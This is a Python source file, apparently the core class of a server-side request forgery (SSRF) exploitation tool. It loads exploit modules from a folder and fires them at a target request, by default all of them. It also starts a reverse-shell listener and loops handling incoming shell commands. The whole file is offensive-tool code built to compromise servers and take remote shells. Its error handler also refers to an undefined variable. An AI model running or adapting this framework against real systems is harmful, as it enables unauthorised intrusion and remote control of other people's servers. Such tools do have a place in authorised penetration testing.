from core.requester import Requester
from core.handler import Handler
from importlib.machinery import SourceFileLoader
import os
import time
import logging
from pathlib import Path


class SSRF(object):
    modules   = set()
    handler   = None
    requester = None

    def __init__(self, args):

        # Set working dir to access all libraries
        self.change_current_dir()

        # Load modules in memory
        self.load_modules()
        
        # Start a reverse shell handler
        if args.handler and args.lport and args.handler == "1":
            handler = Handler(args.lport)
            handler.start()
        elif args.handler and args.lport:
            self.load_handler(args.handler)
            handler = self.handler.exploit(args.lport)
            handler.start()

        proxies = None
        if args.proxy:
            proxies = { 
                "http"  : args.proxy, 
                "https" : args.proxy, 
            }

        # Init a requester
        self.requester = Requester(args.reqfile, args.useragent, args.ssl, proxies)

        # NOTE: if args.param == None, target everything
        if args.param == None:
            logging.warning("No parameter (-p) defined, nothing will be tested!")

        # NOTE: if args.modules == None, try everything
        if args.modules == None:
            logging.warning("No modules (-m) defined, everything will be tested!")
            for module in self.modules:
                module.exploit(self.requester, args)
        else:
            for modname in args.modules.split(','):
                for module in self.modules:
                    if module.name == modname:
                        module.exploit(self.requester, args)
                        break

        # Handling a shell
        while args.handler:
            handler.listen_command()
            time.sleep(5)

    def load_modules(self):
        for index,name in enumerate(os.listdir("./modules")):
            location = os.path.join("./modules", name)
            if ".py" in location:
                mymodule = SourceFileLoader(name, location).load_module()
                self.modules.add(mymodule)

    def load_handler(self, name):
        handler_file = f"{name}.py"
        try:
            location = os.path.join("./handlers", handler_file)
            self.handler = SourceFileLoader(handler_file, location).load_module()
        except Exception as e:
            logging.error(f"Invalid no such handler: {name}")
            exit(1)

    def change_current_dir(self):
        try:
            os.chdir(str(Path(__file__).resolve().parent.parent))
        except PermissionError:
            print(logging.error(f"Error : Access to directory {new_directory} denied. Please verify that you have execute access."))

